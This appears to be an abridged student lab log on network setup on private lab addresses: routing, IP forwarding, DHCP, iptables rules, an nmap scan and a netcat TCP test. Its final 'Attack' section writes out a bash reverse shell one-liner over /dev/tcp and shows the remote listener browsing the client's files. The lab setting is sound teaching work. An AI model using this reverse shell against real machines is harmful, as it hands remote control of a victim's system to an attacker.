...
```student@student:/etc/network$ route -n
...
```student@student:/etc/network$ arp -n
...
```student@student:/etc/network$ sudo sysctl -w net.ipv4.ip_forward=1
...
```C:\Windows\System32>route add 192.168.11.0 mask 255.255.255.0 192.168.33.1
OK!
...
```student@student:/etc/network$ ping 192.168.11.1
...
```student@student:/etc/network$ ping 192.168.11.10
...
```student@student:/etc/network$ ping 192.168.22.1
...
```C:\Users\mhamd>ping 192.168.22.10
...
```C:\Users\mhamd>ping 192.168.11.10
...
```student@student:/etc/network$ sudo service isc-dhcp-server restart
...
```student@student:/etc/network$ sudo ifup -a
...
```student@student:/etc/network$ ping 192.168.200.100
...
```student@student:/etc/network$ ping 192.168.100.100
...
``scp index.html student@192.168.100.2:/home/student/``
```C:\Users\mhamd\Desktop>scp index.html student@192.168.100.2:/home/student/
student@192.168.100.2's password:
index.html                                              100%  111    27.1KB/s   00:00
```
On the server, the file was moved to Apache's root:
```student@student:~$ sudo mv /home/student/index.html /var/www/html/index.html
```
...
```student@student:~$ sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT
...
```student@student:~$ sudo iptables -A INPUT -s 192.168.200.100 -j DROP
```
Rules verification:
```student@student:~$ sudo iptables -L -v
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
...
```student@student:/etc/network$ ping 192.168.100.2
...
```student@student:/etc/network$ nmap 192.168.100.2
...
```student@student:~$ sudo iptables -D INPUT -s 192.168.200.100 -j DROP
student@student:~$ sudo iptables -L -v
...
Client Command: ``echo HelloWorld > /dev/tcp/192.168.100.2/9090
Observation: "HelloWorld" appeared on the server terminal, confirming TCP channel functionality.

```student@student:~$ nc -l 9090 -v
Listening on [0.0.0.0] (family 0, port 9090)
```
```student@student:/etc/network$ echo HelloWorld > /dev/tcp/192.168.100.2/9090
```
```student@student:~$ nc -l 9090 -v
Listening on [0.0.0.0] (family 0, port 9090)
...
Command used:
``./test.sh > ofile 2>&1``
```student@student:~$ ./test.sh > ofile 2>&1
1
...
Preparation: Created witness files (test.txt, etc.) on client.

```student@student:~$ touch test.txt test1.txt test2.txt
```

Attack: Executed Reverse Shell on client:
``bash -i >& /dev/tcp/192.168.100.2/9090 0>&1``

Result: Server gained full client terminal access. Executed ls from server, viewing PC2 files (test.txt, test1.txt), confirming exploitation success.
```student@student:~$ ls
ls
Desktop
Documents
